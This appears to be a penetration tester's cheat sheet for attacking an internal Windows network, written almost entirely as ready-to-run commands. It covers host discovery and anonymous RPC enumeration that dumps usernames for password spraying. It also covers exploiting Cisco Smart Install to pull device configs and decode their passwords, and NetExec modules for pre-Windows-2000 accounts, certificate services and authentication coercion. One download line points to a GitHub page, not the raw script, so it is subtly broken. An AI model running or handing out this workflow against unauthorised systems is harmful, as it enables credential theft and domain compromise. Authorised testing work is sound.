

## Setup BloodHound Mac Intel CPU
curl -L https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-darwin-amd64.tar.gz -o bloodhound-cli.tar.gz
tar -xzf bloodhound-cli.tar.gz
./bloodhound-cli install
./bloodhound-cli config get default_password


----------Inital Host Enumeration --------------

nmap -sn -n -T4 --min-rate 1000 -PS445,3389,80,443 -oG live_hosts_tcp.txt -iL scope.txt... or just use masscan for fast decent results

# (active) scan all private ranges (i.e. 192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8)
netdiscover -i $INTERFACE

# (active) scan a given range (e.g. 192.168.0.0/24)
netdiscover -i $INTERFACE -r $RANGE

NBT discovery
It sends NetBIOS status query to each address in supplied range and lists received information in human readable form. For each responded host it lists IP address, NetBIOS computer name, logged-in user name and MAC address (such as Ethernet).

nbtscan -r $RANGE


----- No Creds  ------

$ rpcclient -U 'DOMAIN/USER%PASSWD2025!' DC-IP

└─$ rpcclient -U '' -N 10.0.0.50
rpcclient $> getusername
Account Name: ANONYMOUS LOGON, Authority Name: NT AUTHORITY
querydominfo
enumdomusers     (dumps all the usernames, to later spray against)

** If you find password_expired.... 
Run; chgpasswd <username> <oldpasswd> <newtemppasswd>

# Check for Cisco Smart Intall
nmap --open -p 4786 -iL live_hosts.txt | grep "Nmap scan report for" | awk '{print $5}'

git clone https://github.com/Sab0tag3d/SIETpy3.git

python3 siet.py -l ../cisco-smart-install.txt -g 

wget https://github.com/patrick-projects/Internal-Workflow/blob/main/cisco_decode_passwds.py

python3 cisco_decode_passwds.py tftp/

------ Low-Priv Credentials -------

nxc ldap -u username -p password -M pre2k
(often no password set and can be changed to login)

nxc ldap -u username -p password -M adcs

nxc smb -u username -p passwd -M coerce_plus
